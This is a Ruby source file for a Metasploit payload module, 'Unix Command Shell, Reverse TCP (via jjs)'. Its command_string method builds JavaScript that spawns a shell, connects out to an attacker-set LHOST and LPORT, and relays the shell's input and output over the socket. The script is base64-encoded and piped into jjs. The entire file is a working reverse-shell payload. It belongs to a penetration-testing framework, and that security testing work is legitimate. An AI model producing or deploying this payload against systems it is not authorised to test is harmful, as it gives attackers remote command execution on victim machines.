##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 863

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Reverse TCP (via jjs)',
        'Description' => 'Connect back and create a command shell via jjs',
        'Author' => [
          'conerpirate', # jjs reverse shell
          'bcoles'       # metasploit
        ],
        'References' => [
          ['URL', 'https://gtfobins.github.io/gtfobins/jjs/'],
          ['URL', 'https://cornerpirate.com/2018/08/17/java-gives-a-shell-for-everything/'],
          ['URL', 'https://h4wkst3r.blogspot.com/2018/05/code-execution-with-jdk-scripting-tools.html'],
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'jjs',
        'Payload' => { 'Offsets' => {}, 'Payload' => '' }
      )
    )
    register_options(
      [
        OptString.new('SHELL', [ true, 'The shell to execute', '/bin/sh' ])
      ]
    )
    register_advanced_options(
      [
        OptString.new('JJSPath', [true, 'The path to the JJS executable', 'jjs'])
      ]
    )
  end

  def generate(_opts = {})
    return super + command_string
  end

  def command_string
    lhost = Rex::Socket.is_ipv6?(datastore['LHOST']) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
    jcode = %{
      var ProcessBuilder=Java.type("java.lang.ProcessBuilder");
      var p=new ProcessBuilder("#{datastore['SHELL']}").redirectErrorStream(true).start();
      var ss=Java.type("java.net.Socket");
      var s=new ss("#{lhost}",#{datastore['LPORT']});
      var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
      var po=p.getOutputStream(),so=s.getOutputStream();
      while(!s.isClosed()){
        while(pi.available()>0)so.write(pi.read());
        while(pe.available()>0)so.write(pe.read());
        while(si.available()>0)po.write(si.read());
        so.flush();
        po.flush();
        Java.type("java.lang.Thread").sleep(50);
        try{p.exitValue();break;}catch(e){}
      };
      p.destroy();s.close();
  }
    minified = jcode.split("\n").map(&:lstrip).join

    %{echo "eval(new java.lang.String(java.util.Base64.decoder.decode('#{Rex::Text.encode_base64(minified)}')));"|#{datastore['JJSPath']}}
  end
end
